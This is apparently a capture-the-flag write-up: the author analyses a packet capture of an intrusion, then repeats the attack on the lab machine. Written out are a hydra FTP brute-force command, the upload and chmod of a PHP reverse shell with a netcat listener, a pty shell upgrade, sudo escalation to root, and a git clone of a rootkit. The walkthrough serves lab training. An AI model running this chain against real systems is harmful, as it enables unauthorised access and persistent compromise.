So this room was FUN i like this room!

So the main senario is that a company/machine has been hacked and we have got the
.pcap files  of the attack which we have to analyse using wireshark! So lets jump in it and read the file to read .pcapfile type

wireshark wireshark Capture.pcapng

so just go through the  requests and you will see FTP Protocols and there you can see some data which can be read like

right click on the file > follow > tcp stream/ http stream

you can see there is a username "jenny" and some passwords 
after going through some of the files we can consider that the attacker used
bruteforcing in ftp to get the password ("password123")

after some of the requests we can see that the attacker got into the ftp and the working directory is /var/www/html


and he uploaded a shell named shell.php 

he downloaded the php-rev shell from : http://pentestmonkey.net/tools/php-reverse-shell

and changed its perms to 777

go through all the files we see there is a connection through the http protocol!
the attacker uploaded the file in ftp and accessed it from the website 

http://ipaddress/shell.php  <------ like this

after going through some more packets we see that the attacker got a shell in the website and is connected to the webshell with used www-data

used python3 -c 'import pty; pty.spawn("/bin/bash")' to get a stable shell 

he just guessed that jenny password for machine could be also password123 like ftp 
and his guess was correct 

the computer's host name was : wir3

he did sudo -l to check what perms he have and he can become root as he have sudo perms

(ALL : ALL) ALL

sudo su

after becoming root he downlaoded a rootkit from github 

git clone https://github.com/f0rb1dd3n/Reptile.git


and used make command to make it and! run it to get a stleathy backdoor!

===========================


Now its our turn to trace back his steps and hack back into the machine!


first we will bruteforce the ftp with user jenny and password list rockyou.txt

hydra -l jenny -P rockyou.txt $ip ftp -Vv -t15 -I

-Vv : for verbosity
-I : to ignore older files of the bruteforce 
-t : to use 15 threads for the process(you can also increase the process upto 64)

we get the password as : 987654321

enters the ftp and upload the shell downloaded from : http://pentestmonkey.net/tools/php-reverse-shell

remeber to change the ip and port in the webshell to you tryhackme ip and port to any other

enter the ftp and upload the file

put webshell.php

now change the permissions of the file so that server can execute the file!

chmod 777 webshell.php

now start a rev connection netcat listener on other terminal

nc -lvnp port

port: enter the port number you entered in the webshell.php file

now execute the web shell by browsing to the webshell through the browser

http://$ip/webshellname.php

this will give a rev connection on your terminal! after that

i tried to make a stable shell by this

python3 -c 'import pty; pty.spawn("/bin/bash")'


now when you will type sudo -l 

you will be asked for www-data! 

tried to find suid files but that didnt worked

find / -type f -perm -u=s 2>/dev/null


after alot of thinking i though that attacker used the same password used in ftp to login as the used jenny

i did that too

su jenny
987654321

i became the jenny user after that i tried sudo -l

and jenny still have perms to become sudo by sudo su

and i became the root! and got the flag saved in the /root/ dir inside the reptile directory ! 

					CONGRATS!
